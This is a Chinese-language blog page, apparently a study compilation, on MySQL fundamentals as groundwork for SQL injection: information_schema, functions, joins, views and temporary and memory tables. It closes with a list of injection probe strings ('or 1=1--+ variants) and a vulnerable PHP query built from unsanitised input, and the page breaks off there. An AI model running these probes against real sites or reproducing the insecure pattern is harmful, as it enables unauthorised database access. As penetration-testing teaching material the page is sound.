@@ -1,0 +1,2210 @@
+<!DOCTYPE html>
+<html lang="zh-Hans">
+  <head>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <meta http-equiv="X-UA-Compatible" content="ie=edge" />
+    <title>MySQL注入从入门到入狱 知识点汇编 | rebootORZ Security</title>
+
+    
+<link href="favicon.ico" rel="shortcut icon" type="image/x-icon" />
+
+
+
+
+<meta name="author" content="rebootORZ" />
+<meta name="description" content="MySQL注入从入门到入狱-知识点汇编 参考文档：《Web安全攻防渗透测试实战指南》、《SQL注入天书》 参考博客：https://www.lo" />
+
+
+
+<meta name="generator" content="Hugo 0.101.0" />
+
+<link rel="canonical" href="https://rebootorz.github.io/posts/mysql%E6%B3%A8%E5%85%A5%E4%BB%8E%E5%85%A5%E9%97%A8%E5%88%B0%E5%85%A5%E7%8B%B1-%E7%9F%A5%E8%AF%86%E7%82%B9%E6%B1%87%E7%BC%96/" />
+
+
+<meta property="og:title" content="MySQL注入从入门到入狱 知识点汇编" />
+<meta property="og:description" content="MySQL注入从入门到入狱-知识点汇编 参考文档：《Web安全攻防渗透测试实战指南》、《SQL注入天书》 参考博客：https://www.lo" />
+<meta property="og:type" content="article" />
+<meta property="og:url" content="https://rebootorz.github.io/posts/mysql%E6%B3%A8%E5%85%A5%E4%BB%8E%E5%85%A5%E9%97%A8%E5%88%B0%E5%85%A5%E7%8B%B1-%E7%9F%A5%E8%AF%86%E7%82%B9%E6%B1%87%E7%BC%96/" /><meta property="og:image" content="https://rebootorz.github.io/me/background.jpg"/><meta property="article:section" content="posts" />
+<meta property="article:published_time" content="2022-07-05T17:22:36+08:00" />
+<meta property="article:modified_time" content="2022-07-05T17:22:36+08:00" />
+
+
+
+
+<meta name="twitter:card" content="summary_large_image"/>
+<meta name="twitter:image" content="https://rebootorz.github.io/me/background.jpg"/>
+
+<meta name="twitter:title" content="MySQL注入从入门到入狱 知识点汇编"/>
+<meta name="twitter:description" content="MySQL注入从入门到入狱-知识点汇编 参考文档：《Web安全攻防渗透测试实战指南》、《SQL注入天书》 参考博客：https://www.lo"/>
+
+
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/semantic-ui@2.4.2/dist/semantic.min.css" integrity="sha256-UXesixbeLkB/UYxVTzuj/gg3+LMzgwAmg3zD+C4ZASQ=" crossorigin="anonymous">
+<link rel="stylesheet" href="/css/icomoon.css" />
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/overlayscrollbars@1.13.1/css/OverlayScrollbars.min.css" integrity="sha256-WKijf8KI68sbq8Znd6yMepIuFF0wdWfIt6gk3JWcQfk=" crossorigin="anonymous">
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/github-markdown-css@4.0.0/github-markdown.min.css">
+<link rel="stylesheet" href="/css/site.css" />
+
+<style>
+  .ui.header a:not(.item, .ui.button):hover {
+    text-decoration: underline;
+  }
+
+  
+  a:not(.item, .ui.button) {
+    color: seagreen !important;
+  }
+  
+
+  
+  .inverted a:not(.item, .ui.button) {
+     color: darkseagreen !important;
+  }
+  
+
+  
+  body.default {
+    
+    background-color: #fff;
+    
+
+    
+    background-image: url(/me/black_background.jpg);
+    
+  }
+  
+
+  
+  body.dark {
+    
+
+    
+    background-image: url(/me/light_background.jpeg);
+    
+  }
+  
+</style>
+
+
+    
+
+
+
+
+
+
+
+    
+    <link rel="stylesheet" href="/css/custom.css" />
+    
+  </head>
+
+  <body class="default">
+    
+<nav class="ui secondary menu dream-menu dream-nav">
+
+  <a class="item dream-flip-toggle" title="翻转！">
+    <i class="large link bullseye icon"></i>
+  </a>
+  <a class="item" href="https://rebootorz.github.io" title="首页">
+    <i class="large link home icon"></i>
+  </a>
+  
+  <a class="item" onclick="themeSwitch(event)">
+    <i class="large link icon theme-switch"></i>
+  </a>
+  
+  
+  <a class="item" title="搜索" onclick="toggleSearch(event)">
+    <i class="large link search icon"></i>
+  </a>
+  
+</nav>
+
+    <div class="flip-container">
+      <div class="flipper">
+        <section class="front">
+          <div class="dream-max-width">
+            
+<div class="ui relaxed centered grid dream-grid dream-grid-single">
+  
+  
+  
+  
+
+  
+  <aside class="sixteen wide mobile sixteen wide tablet three wide computer column dream-single-aside">
+    
+    <div class="ui segment toc">
+      <nav id="TableOfContents">
+  <ul>
+    <li><a href="#mysql注入从入门到入狱-知识点汇编">MySQL注入从入门到入狱-知识点汇编</a></li>
+    <li><a href="#1">1.</a></li>
+  </ul>
+</nav>
+    </div>
+    
+
+    
+  </aside>
+  
+  <div class="sixteen wide mobile sixteen wide tablet ten wide computer column markdown-body dream-single" id="dream-save-post-as-img">
+    <section class="ui segment">
+      <header>
+        <h1 class="ui large header">MySQL注入从入门到入狱 知识点汇编<span class="sub header">
+            <span class="left">
+              @
+              
+                
+                  rebootORZ
+                
+              
+
+              | 
+                  <span data-format="luxon">2022-07-05T17:22:36&#43;08:00</span>
+                
+
+              | 32 分钟阅读
+
+              
+              | 更新于
+                
+                  <span data-format="luxon">2022-07-05T17:22:36&#43;08:00</span>
+                
+              
+            </span>
+
+            
+            <span class="dream-share">
+  <a href="#" class="save-as-image" title="保存为图片" onclick="savePostAsImg()">
+    <i class="save icon"></i>
+  </a>
+  <a href="https://twitter.com/intent/tweet?text=MySQL%e6%b3%a8%e5%85%a5%e4%bb%8e%e5%85%a5%e9%97%a8%e5%88%b0%e5%85%a5%e7%8b%b1%20%e7%9f%a5%e8%af%86%e7%82%b9%e6%b1%87%e7%bc%96&url=https%3a%2f%2frebootorz.github.io%2fposts%2fmysql%25E6%25B3%25A8%25E5%2585%25A5%25E4%25BB%258E%25E5%2585%25A5%25E9%2597%25A8%25E5%2588%25B0%25E5%2585%25A5%25E7%258B%25B1-%25E7%259F%25A5%25E8%25AF%2586%25E7%2582%25B9%25E6%25B1%2587%25E7%25BC%2596%2f" title="Twitter">
+    <i class="twitter icon"></i>
+  </a>
+  <a href="https://facebook.com/sharer/sharer.php?u=https%3a%2f%2frebootorz.github.io%2fposts%2fmysql%25E6%25B3%25A8%25E5%2585%25A5%25E4%25BB%258E%25E5%2585%25A5%25E9%2597%25A8%25E5%2588%25B0%25E5%2585%25A5%25E7%258B%25B1-%25E7%259F%25A5%25E8%25AF%2586%25E7%2582%25B9%25E6%25B1%2587%25E7%25BC%2596%2f" title="Facebook">
+    <i class="facebook icon"></i>
+  </a>
+</span>
+
+            
+          </span>
+        </h1>
+      </header>
+
+      <article class="main">
+        
+
+        <h2 id="mysql注入从入门到入狱-知识点汇编">MySQL注入从入门到入狱-知识点汇编</h2>
+<ul>
+<li>参考文档：《Web安全攻防渗透测试实战指南》、《SQL注入天书》</li>
+<li>参考博客：https://www.loongten.com</li>
+<li>   <a href="https://www.runoob.com">https://www.runoob.com</a></li>
+<li>搬运工：rebootORZ</li>
+</ul>
+<ol>
+<li>初识“information_schema”</li>
+</ol>
+<ul>
+<li>在mysql 5.0版本后，默认在数据库中存放一个“information_schema”的数据库，在该数据库中，需要记住三个表名：</li>
+<li>SCHEMATA 存储该用户创建的所有数据库的库名</li>
+<li> 记录数据库名的字段名&mdash;-SCHEMA_NAME</li>
+</ul>
+<p><img src="/imgs/0.8460962997354369-20220428154804-cr80x42.png" alt="image"></p>
+<ul>
+<li>TABLES    存储该用户创建的所有数据库的库名和表名</li>
+<li>               库名&mdash;TABLE_SCHEMA</li>
+<li>表名&mdash;TABLE_NAME</li>
+</ul>
+<p><img src="/imgs/0.5932755393269672-20220428154804-zkrvt4r.png" alt="image"></p>
+<ul>
+<li>COLUMNS  存储该用户创建的所有数据库的库名、表明、字段名</li>
+<li>库名&mdash;TABLE_SCHEMA</li>
+<li>表名&mdash;TABLE_NAME</li>
+<li>字段名&mdash;COLUMN_NAME</li>
+</ul>
+<p><img src="/imgs/0.10255587787744795-20220428154804-82akssg.png" alt="image"></p>
+<ol>
+<li>常用MySQL查询语句：</li>
+</ol>
+<ul>
+<li>不知道任何条件时：</li>
+<li>SELECT  要查询的字段名  FROM  库名.表名</li>
+</ul>
+<p><img src="/imgs/0.20493027393475716-20220428154804-d0b9kqk.png" alt="image"></p>
+<ul>
+<li>SELECT applyname FROM espcms_p8_demo.espcms_apply</li>
+</ul>
+<p><img src="/imgs/0.8431483549811518-20220428154804-e7himaf.png" alt="image"></p>
+<ul>
+<li>在知道一个已知条件时：</li>
+<li>SELECT  要查询的字段名 FROM 库名.表名  WHERE  已知条件的字段名=&lsquo;已知条件的值&rsquo;</li>
+</ul>
+<p><img src="/imgs/0.22244834593601623-20220428154804-qgzeh03.png" alt="image"></p>
+<ul>
+<li>SELECT applyname FROM espcms_p8_demo.espcms_apply WHERE applyname=&lsquo;会员管理&rsquo;</li>
+</ul>
+<p><img src="/imgs/0.18802110062833718-20220428154804-wr8vcvr.png" alt="image"></p>
+<ul>
+<li>在知道两个已知条件时：</li>
+<li>SELECT 要查询的字段名 FROM 库名.表名 WHERE 已知条件1的字段名=&lsquo;已知条件1的值&rsquo; AND 已知条件2的字段名=&lsquo;已知条件2的值&rsquo;</li>
+</ul>
+<p><img src="/imgs/0.9515435089425861-20220428154804-dwf57np.png" alt="image"></p>
+<ul>
+<li>SELECT applyname FROM espcms_p8_demo.espcms_apply WHERE appid=&lsquo;1&rsquo; AND applycode=&lsquo;member&rsquo;;</li>
+</ul>
+<p><img src="/imgs/0.10369772759354895-20220428154804-abohc44.png" alt="image"></p>
+<ol>
+<li>常用函数</li>
+<li>database()</li>
+</ol>
+<ul>
+<li>当前网站使用的数据库。</li>
+</ul>
+<p><img src="/imgs/0.7431661613343435-20220428154804-s255xj3.png" alt="image"></p>
+<ol>
+<li>version()</li>
+</ol>
+<ul>
+<li>当前MySQL的版本。</li>
+</ul>
+<p><img src="/imgs/0.08277161229640258-20220428154804-i4cn9l1.png" alt="image"></p>
+<ol>
+<li>user()</li>
+</ol>
+<ul>
+<li>当前MySQL的用户。</li>
+</ul>
+<p><img src="/imgs/0.7642883904201182-20220428154804-lba9849.png" alt="image"></p>
+<ol>
+<li>@@datadir</li>
+</ol>
+<ul>
+<li>数据库路径</li>
+</ul>
+<p><img src="/imgs/0.4510998941141261-20220428154804-e705qtk.png" alt="image"></p>
+<ol>
+<li>@@version_compile_os</li>
+</ol>
+<ul>
+<li>操作系统版本。</li>
+</ul>
+<p><img src="/imgs/0.35385321499258937-20220428154804-taevklb.png" alt="image"></p>
+<ol>
+<li>substr()</li>
+</ol>
+<ul>
+<li>用法：</li>
+<li>substr(string, start,length);</li>
+<li>string为字符串；</li>
+<li>start为起始位置；</li>
+<li>length为长度。</li>
+<li>区别：</li>
+<li>mysql中的start是从1开始的</li>
+</ul>
+<p><img src="/imgs/0.8525085240235147-20220428154804-pzj0a27.png" alt="image"></p>
+<ol>
+<li>gretest()</li>
+</ol>
+<ul>
+<li>greatest(n1, n2, n3…): 返回 n 中的最大值</li>
+</ul>
+<p><img src="/imgs/0.8805642717990839-20220428154804-da4zyjz.png" alt="image"></p>
+<ol>
+<li>ascii()</li>
+</ol>
+<ul>
+<li>返回字符的ascii</li>
+</ul>
+<p><img src="/imgs/0.5351177879071509-20220428154804-mr10qt6.png" alt="image"></p>
+<ul>
+<li>默认返回字符串最左边字符的ASCII</li>
+</ul>
+<p><img src="/imgs/0.030598883109708715-20220428154804-li3qoru.png" alt="image"></p>
+<ol>
+<li>strcmp()</li>
+</ol>
+<table>
+<thead>
+<tr>
+<th>mysql&gt; SELECT STRCMP(&rsquo;text&rsquo;, &rsquo;text2&rsquo;);<br>        -&gt; -1<br>mysql&gt; SELECT STRCMP(&rsquo;text2&rsquo;, &rsquo;text&rsquo;);<br>        -&gt; 1<br>mysql&gt; SELECT STRCMP(&rsquo;text&rsquo;, &rsquo;text&rsquo;);<br>        -&gt; 0</th>
+</tr>
+</thead>
+</table>
+<ol>
+<li>字符与字节与编码关系</li>
+</ol>
+<ul>
+<li>ASCII码中，一个英文字母（不分大小写）占一个字节的空间，一个中文汉字占两个字节的空间。一个二进制数字序列，在计算机中作为一个数字单元，一般为8位二进制数()，换算为十进制。最小值0，最大值255。</li>
+<li>UTF-8编码中，一个英文字符等于一个字节，一个中文（含繁体）等于三个字节。</li>
+<li>Unicode编码中，一个英文等于两个字节，一个中文（含繁体）等于两个字节。</li>
+<li>注：</li>
+<li>位是最小的存储单位,每一个位存储一个1位的二进制码,一个字节由8位组成。而字通常为16、32或64个位组成。</li>
+</ul>
+<ol>
+<li>Varchar与char区别</li>
+</ol>
+<ul>
+<li>char固定长度的类型：</li>
+<li>char(M)类型的数据列里，每个值都占用M个字节，如果某个长度小于M，MySQL就会在它的右边用空格字符补足。（在检索操作中那些填补出来的空格字符将被去掉）（当插入的数据超过规定的长度则会被截取掉）。</li>
+</ul>
+<p><img src="/imgs/0.26877104898994-20220428154804-opj652a.png" alt="image"></p>
+<ul>
+<li>varchar可变长度的类型：</li>
+<li>在varchar(M)类型的数据列里，每个值只占用刚好够用的字节再加上一个用来记录其长度的字节（即总长度为L+1字节）。</li>
+</ul>
+<p><img src="/imgs/0.7989005645832701-20220428154804-a3dmouj.png" alt="image"></p>
+<ol>
+<li>常用操作符</li>
+<li>UNION</li>
+</ol>
+<ul>
+<li>UNION 操作符用于合并两个或多个 SELECT 语句的结果集。</li>
+<li>要注意，UNION 内部的每个 SELECT 语句必须拥有相同数量的列。列也必须拥有相似的数据类型。同时，每个 SELECT 语句中的列的顺序必须相同。</li>
+<li>SQL UNION 语法</li>
+<li>SELECT column_name(s) FROM table_name1</li>
+<li>UNION</li>
+<li>SELECT column_name(s) FROM table_name2</li>
+<li>注释：默认地，UNION 操作符选取不同的值。如果允许重复的值，请使用UNION ALL。</li>
+<li>SQL UNION ALL 语法</li>
+<li>SELECT column_name(s) FROM table_name1</li>
+<li>UNION ALL</li>
+<li>SELECT column_name(s) FROM table_name2</li>
+<li>另外，UNION 结果集中的列名总是等于UNION 中第一个SELECT 语句中的列名。</li>
+</ul>
+<ol>
+<li>JOIN</li>
+</ol>
+<ul>
+<li>可以在 SELECT, UPDATE 和 DELETE 语句中使用 Mysql 的 JOIN 来联合多表查询。</li>
+<li>JOIN 按照功能大致分为如下三类：</li>
+<li>INNER JOIN（内连接,或等值连接）：获取两个表中字段匹配关系的记录。</li>
+<li>LEFT JOIN（左连接）：获取左表所有记录，即使右表没有对应匹配的记录。</li>
+<li>RIGHT JOIN（右连接）： 与 LEFT JOIN 相反，用于获取右表所有记录，即使左表没有对应匹配的记录。</li>
+<li>知识点补充：</li>
+<li>参考链接：<a href="https://www.runoob.com/mysql/mysql-join.html">https://www.runoob.com/mysql/mysql-join.html</a></li>
+<li>测试用例使用方法：</li>
+<li>新建一个数据库runoob后，邮件运行SQL文件：</li>
+</ul>
+<p><img src="/imgs/0.4700963306025839-20220428154804-mms3z86.png" alt="image"></p>
+<ul>
+<li>执行完毕后即可：</li>
+</ul>
+<p><img src="/imgs/0.57222598022368-20220428154804-twaxpzy.png" alt="image"></p>
+<p><img src="/imgs/0.07771783260371729-20220428154804-5v5nvei.png" alt="image"></p>
+<ul>
+<li>先查看表中内容：</li>
+</ul>
+<p><img src="/imgs/0.43645622622721475-20220428154804-m2bvy3t.png" alt="image"></p>
+<p><img src="/imgs/0.6972829637313384-20220428154804-d7nk4xd.png" alt="image"></p>
+<ol>
+<li>JOIN/INNER JOIN</li>
+</ol>
+<ul>
+<li>接下来我们就使用MySQL的INNER JOIN(也可以省略 INNER 使用 JOIN，效果一样)来连接以上两张表来读取runoob_tbl表中所有runoob_author字段在tcount_tbl表对应的runoob_count字段值：</li>
+<li>SELECT a.runoob_id, a.runoob_author, b.runoob_count FROM runoob_tbl a INNER JOIN tcount_tbl b ON a.runoob_author = b.runoob_author;</li>
+</ul>
+<p><img src="/imgs/0.7612060993846707-20220428154804-qagc98n.png" alt="image"></p>
+<ul>
+<li>注：a和b只是用来指代的，可以换别的。</li>
+<li>a开头的指代是从a表中取的字段，b开头的指代从b表中取的字段，在FROM后面的“表名.a/b”声明了那张表对应a，哪张表对应b。</li>
+<li>这类似于取交集：</li>
+</ul>
+<p><img src="/imgs/0.7332300685135736-20220428154804-nkbme8w.png" alt="image"></p>
+<ol>
+<li>LEFT JOIN</li>
+</ol>
+<ul>
+<li>left join 与 join 有所不同。 MySQL LEFT JOIN 会读取左边数据表的全部数据，即便右边表无对应数据。</li>
+<li>实例：</li>
+<li>尝试以下实例，以 runoob_tbl 为左表，tcount_tbl 为右表，理解 MySQL LEFT JOIN 的应用：</li>
+</ul>
+<p><img src="/imgs/0.7142085427076501-20220428154804-8hy07if.png" alt="image"></p>
+<ul>
+<li>以上实例中使用了 LEFT JOIN，该语句会读取左边的数据表 runoob_tbl 的所有选取的字</li>
+<li>段段数据，即便在右侧表 tcount_tbl中 没有对应的 runoob_author 字段值。</li>
+</ul>
+<p><img src="/imgs/0.04012349231618304-20220428154804-ilyngap.png" alt="image"></p>
+<ol>
+<li>RIGHT JOIN</li>
+</ol>
+<ul>
+<li>RIGHT JOIN 会读取右边数据表的全部数据，即便左边边表无对应数据。</li>
+<li>实例：</li>
+<li>尝试以下实例，以 runoob_tbl 为左表，tcount_tbl 为右表，理解MySQL RIGHT JOIN的应用：</li>
+</ul>
+<p><img src="/imgs/0.2335143508439321-20220428154804-80oon4c.png" alt="image"></p>
+<ul>
+<li>以上实例中使用了 RIGHT JOIN，该语句会读取右边的数据表 tcount_tbl 的所有选取的字段数据，即便在左侧表 runoob_tbl 中没有对应的runoob_author 字段值。</li>
+</ul>
+<p><img src="/imgs/0.8077962848021347-20220428154804-u9lbh9f.png" alt="image"></p>
+<ol>
+<li>AS</li>
+</ol>
+<ul>
+<li>as可理解为：用作、当成，作为；一般是重命名列名或者表名（主要为了查询方便）。</li>
+</ul>
+<ol>
+<li>如：表text，  列 column_1,column_2  你可以写成</li>
+</ol>
+<ul>
+<li>select  column_1  as  列1,column_2 as  列2   from  text as  表;</li>
+</ul>
+<p><img src="/imgs/0.5686744026151972-20220428154804-avolm3z.png" alt="image"></p>
+<ol>
+<li>查找runoob_tb1的所有内容并命名为B</li>
+</ol>
+<ul>
+<li>当你命名一个表之后，你可以在下面用 B 代替 runoob_tb1；</li>
+</ul>
+<p><img src="/imgs/0.3245467078435604-20220428154804-nxgupf6.png" alt="image"></p>
+<ol>
+<li>USING()</li>
+</ol>
+<ul>
+<li>using等价于join操作中的on，例如a和b根据id字段关联，那么以下等价:</li>
+<li>using(id)</li>
+<li>on a.id=b.id</li>
+<li>以下2个实例等价：</li>
+<li>select   a.name,b.age  from  test  as  a  join  test2  as  b  on  a.id=b.id;</li>
+<li>select   a.name,b.age  from  test  as  a  join  test2  as  b  using(id);</li>
+</ul>
+<ol>
+<li>LIMIT</li>
+</ol>
+<ul>
+<li>limit的使用格式为limit m,n 其中m是指记录开始的位置，从0开始，表示第一条记录；n是指取n条记录。例如limit 0,1 表示从第一条记录开始，取1条记录。</li>
+<li>示例：</li>
+<li><a href="http://phpmyadmin/phpMyAdmin4.8.5/url.php?url=https://dev.mysql.com/doc/refman/5.5/en/select.html">SELECT</a> * FROM espcms_p8_demo.espcms_apply；</li>
+</ul>
+<p><img src="/imgs/0.006877487175406819-20220428154804-919d8eb.png" alt="image"></p>
+<ul>
+<li><a href="http://phpmyadmin/phpMyAdmin4.8.5/url.php?url=https://dev.mysql.com/doc/refman/5.5/en/select.html">SELECT</a> * FROM espcms_p8_demo.espcms_apply LIMIT 0,1；</li>
+</ul>
+<p><img src="/imgs/0.5466322774877926-20220428154804-sqewb21.png" alt="image"></p>
+<ol>
+<li>注释符</li>
+</ol>
+<ul>
+<li>在MySQL中，常见注释符的表达方式：</li>
+</ul>
+<h2 id="1">1.</h2>
+<ol start="2">
+<li>--空格</li>
+<li>/**/</li>
+<li>内联注释：</li>
+</ol>
+<ul>
+<li>MySQL为了保持与其他数据库的兼容，特地添加的功能，为了避免从MySQL            中导出的SQL语句不能被其他数据库使用，它把一些MySQL特有的语句放在            /*!&hellip;*/中，这些语句在不兼容的数据库中不会执行，而在MYSQL中却可以            被识别和执行。</li>
+<li>内联注释的形式：/*！ code*/。</li>
+<li>解释：/**/只能是用来将整个语句注释起来，而/*! 可以用来在语句中进行            注释，例如：</li>
+<li>/*select  from tables;*/</li>
+<li>/*!select*/ /!*from*/ tables;</li>
+</ul>
+<ol>
+<li>字符串连接函数</li>
+</ol>
+<ul>
+<li>函数具体介绍http://www.cnblogs.com/lcamry/p/5715634.html</li>
+<li>1. concat(str1,str2,&hellip;)——没有分隔符地连接字符串。</li>
+<li>2. concat_ws(separator,str1,str2,&hellip;)——含有分隔符地连接字符串。</li>
+<li>3. group_concat(str1,str2,&hellip;)——连接一个组的所有字符串，并以逗号分隔每一条数据。</li>
+<li>说着比较抽象，其实也并不需要详细了解，知道这三个函数能一次性查出所有信息就行了。</li>
+</ul>
+<ol>
+<li>虚拟表</li>
+</ol>
+<ul>
+<li>虚拟表，就是实际上并不存在（物理上不存在），但是逻辑上存在的表。</li>
+<li>在MySQL中，存在的虚拟表：临时表、内存表和视图，派生表。</li>
+<li>默认自带的虚拟表：Dual &mdash;&ndash; 5.1后才有。</li>
+<li>不知道涉及哪个表的时候，可以指定DUAL作为一个假的表名：</li>
+</ul>
+<p><img src="/imgs/0.34794763859077327-20220428154804-ayhb8zv.png" alt="image"></p>
+<ol>
+<li>派生表</li>
+</ol>
+<ul>
+<li>当select语句的from子句中使用独立子查询时，就称其为派生表。</li>
+</ul>
+<table>
+<thead>
+<tr>
+<th>select column_list<br>from (<br>      select column_list<br>      from table_1<br>      ) derived_table_name<br>where derived_table_name.c1 &gt; 0 ;</th>
+</tr>
+</thead>
+</table>
+<ul>
+<li>与子查询不同，派生表必须具有别名，以便稍后在查询中引用其名字。</li>
+<li>如果派生表没有别名，则出错。</li>
+</ul>
+<ol>
+<li>视图</li>
+</ol>
+<ul>
+<li>视图是为了方便多个表联表查询而设计的，所以视图也是多个表中的字段由各个表中的关联关系而创建的一种虚拟表。</li>
+<li>视图创建后就保存了下来，以后可以随时用，除非drop删除视图。</li>
+<li>注：</li>
+<li>在数据库中，只存放了视图的定义，并没有存放视图的数据，数据还是存储在原来的表中，</li>
+<li>视图的数据是依赖原来表中的数据的，所以原来表的数据发生了改变，那么显示的视图的数据也会随着改变。</li>
+<li>一般来说，我们只是利用视图来查询数据，不会通过视图来操作数据。</li>
+</ul>
+<table>
+<thead>
+<tr>
+<th>1.创建视图other<br>create view other as<br>select a.runoob_title as rtitle, b.runoob_count as rcount from<br>runoob_tbl as a, tcount_tbl as b where a.runoob_author=b.runoob_author;<br><img src="/imgs/0.6900350238472815-20220428154804-0q30we4.png" alt="image"><br><img src="/imgs/0.757870304207196-20220428154804-yabiddc.png" alt="image"><br>2.删除视图<br>drop view if exists other;<br><img src="/imgs/0.7961692912189413-20220428154804-d3kbpzn.png" alt="image"><br>3.调用视图<br>select * from other;<br><img src="/imgs/0.4869944703627572-20220428154804-3leqwwx.png" alt="image"><br>4.如果视图不存在，则创建视图；如果视图存在，则修改视图<br>create or replace view  视图名称  as select  语句;<br>例如:<br>create or REPLACE view testview as select a.runoob_title,a.runoob_author,b.runoob_count from runoob_tbl a join tcount_tbl b  using(runoob_author);<br><img src="/imgs/0.0005901068268144833-20220428154804-2rm09me.png" alt="image"></th>
+</tr>
+</thead>
+</table>
+<ul>
+<li>视图创建一遍后会在navicat premium（MySQL可视化工具）保存下来，不可重复创建视图，所以想重复调试创建视图，需先删除已创建的视图，在执行创建视图的SQL命令或者是修改视图。</li>
+<li>视图作用：</li>
+<li>提高了重用性，就项一个函数，创建一次，可重复调用。</li>
+<li>对数据库重构，却不影响原数据。</li>
+<li>让数据更加清晰。想要什么样的数据，就创建什么样的视图。</li>
+<li>视图定义的存放位置：information_schema.views</li>
+<li>查看视图的基本信息：DESC view_name;</li>
+<li>注意：</li>
+<li>    修改视图的数据，将直接修改数据表（即原表）的真实数据。</li>
+<li>    删除视图，不会影响原表的数据，但是删除视图的数据，则会影响到原表。</li>
+<li>既可以从select语句可以返回虚拟表，又可以通过构建表结构创建虚拟表的是临时表和内存表。</li>
+</ul>
+<ol>
+<li>临时表</li>
+</ol>
+<ul>
+<li>MySQL临时表在保存一些临时数据时是非常有用的。</li>
+<li>临时表是建立在系统临时文件夹中的表，使用得当，完全可以像普通表一样进行各种操作。</li>
+<li>临时表的数据和表结构都存储在内存中。</li>
+<li>临时表只在当前MySQL连接可见，当关闭连接时，MySQL会自动删除表并释放所有空间。</li>
+</ul>
+<table>
+<thead>
+<tr>
+<th>1.通过构建临时表结构创建临时表<br>create temporary table tmp_table (<br>name VARCHAR(10) NOT NULL,<br>value INTEGER NOT NULL<br>);<br><img src="/imgs/0.3283961044838334-20220428154804-haqqe5h.png" alt="image"><br>select * from tmp_table;<br><img src="/imgs/0.34206254866305236-20220428154804-56onzuz.png" alt="image"><br>2.直接将查询结果导入临时表<br>create temporary table tmp_table select * from other;<br>例如这里我将上面我们生成的视图testview，将其内容导入到这里的临时表：<br><img src="/imgs/0.3747400884420156-20220428154804-2wh9waa.png" alt="image"><br>3.删除临时表<br>drop table tmp_table;<br><img src="/imgs/0.40251478559413273-20220428154804-62fo56l.png" alt="image"></th>
+</tr>
+</thead>
+</table>
+<ul>
+<li>临时表的应用（简单了解即可）：</li>
+<li>        当某一个SQL语句关联的表在2张及以上，并且和一些小表关联。可以采用将大表进行拆分并且得到比较小的结果集合存放在临时表中。</li>
+<li>        程序执行过程中可能需要存放一些临时数据，这些数据在整个程序的会话过程中需要重复使用。</li>
+<li>        临时表默认是MyISAM（存储引擎），但是可以修改。</li>
+<li>注意：</li>
+<li>        临时表与存在的表名相同的时候，存在的表会被隐藏，当临时表被drop，存在的表就可见了。</li>
+<li>        show tables语句不会列举临时表，但是会列出内存表。</li>
+<li>        临时表在数据库多个连接之间不能共享。</li>
+<li>        临时表的最大所需内存需要通过tmp_table_size=128MB设定。当数据超过临时表的最大值设定时，自动转为磁盘表，此时因需要进行IO操作，性能会大大下降，而内存表不会，内存表满后，会提示数据满错误。</li>
+<li>临时表更多作用是系统自己创建或组织数据以提升性能，如子查询。</li>
+</ul>
+<ol>
+<li>内存表</li>
+</ol>
+<ul>
+<li>表结构建在磁盘上，数据在内存里，当停止服务后，表中的数据会丢失，而表的结构不会丢失。</li>
+<li>内存表也可以被看作是临时表的一种。</li>
+</ul>
+<table>
+<thead>
+<tr>
+<th>1.通过构建内存表结构创建内存表<br>create table tmp_table (<br>name VARCHAR(10) NOT NULL,<br>value INTEGER NOT NULL<br>)ENGINE=MEMORY;<br><img src="/imgs/0.9073016621864991-20220428154804-f3dg5vr.png" alt="image"><br>select * from tmp_table;<br><img src="/imgs/0.5046178920439985-20220428154804-sk9a9m4.png" alt="image"><br>show tables;<br>可以看到我们刚创建的内存表。<br><img src="/imgs/0.05964622651707131-20220428154804-2u93l6g.png" alt="image"><br>2.直接将查询结果导入内存表<br>同样的，这里我们从视图testview中取过来数据<br>create table tmp_table engine=memory  select * from testview;<br><img src="/imgs/0.2833597317334794-20220428154804-oqrlhvw.png" alt="image"><br>3.释放占用的内存<br>-- 删除数据<br>delete from tmp_table;<br><img src="/imgs/0.3996239382452873-20220428154804-ff920vl.png" alt="image"><br>-- 清空表<br>truncate table tmp_table;<br><img src="/imgs/0.8693183980135087-20220428154804-w9r5kf1.png" alt="image"><br>-- 删除表<br>drop table tmp_table;<br><img src="/imgs/0.9234263974691145-20220428154804-gsirqpq.png" alt="image"></th>
+</tr>
+</thead>
+</table>
+<ul>
+<li>内存表特征（简单了解即可）：</li>
+<li>    对于varchar等变长类型，内存表使用固定的长度来存放。</li>
+<li>    内存表可以有非唯一的键。</li>
+<li>    内存表不能包含BLOB或TEXT列。</li>
+<li>    内存表支持AUTO_INCREMENT列。</li>
+<li>    内存表支持插入延迟，使读取优先。</li>
+<li>    当临时表变得很大时，MySQL会自动地把它转化为在磁盘上存储的表，而内存表不会自动转换。</li>
+<li>    在MySQL的主从服务器上，内存表可以被复制。</li>
+<li>    内存表最大的size受限于系统变量max_heap_table_size，默认值是16MB，这个变量是可以修改的。</li>
+<li>    内存表对所有用户的连接都是可见的，使得它非常适合做缓存。</li>
+<li>    内存表必须使用memory存储引擎。</li>
+</ul>
+<ol>
+<li>临时内存表</li>
+</ol>
+<table>
+<thead>
+<tr>
+<th>1.通过构建表结构创建临时内存表<br>create temporary table tmp_table (<br>name VARCHAR(10) NOT NULL,<br>value INTEGER NOT NULL<br>)ENGINE=MEMORY;<br><img src="/imgs/0.5109499268395801-20220428154804-2393yxm.png" alt="image"><br>select * from tmp_table;<br>show tables;<br><img src="/imgs/0.6102662975557148-20220428154804-fkgswhs.png" alt="image"><br>2.直接将查询结果导入内存表<br>create temporary table tmp_table engine=memory select * from other;<br><img src="/imgs/0.8722326133356997-20220428154804-pzhlfs6.png" alt="image"></th>
+</tr>
+</thead>
+</table>
+<ol>
+<li>常用注入点判断语句</li>
+</ol>
+<ul>
+<li>Ps:&ndash;+可以用#替换，url 提交过程中Url 编码后的#为%23</li>
+<li>or 1=1&ndash;+</li>
+<li>&lsquo;or 1=1&ndash;+</li>
+<li>&ldquo;or 1=1&ndash;+</li>
+<li>)or 1=1&ndash;+</li>
+<li>&lsquo;)or 1=1&ndash;+</li>
+<li>&ldquo;) or 1=1&ndash;+</li>
+<li>&ldquo;))or 1=1&ndash;+</li>
+<li>一般注入点的代码为：</li>
+<li>$id=$_GET[&lsquo;id&rsquo;];</li>
+<li>$sql=&ldquo;SELECT * FROM users WHERE id=&rsquo;$id&rsquo; LIMIT 0,1&rdquo;;</li>
+<li>此处考虑两个点，一个是闭合前面的‘ 另一个是处理后面的‘ ，一般采用两种思</li>
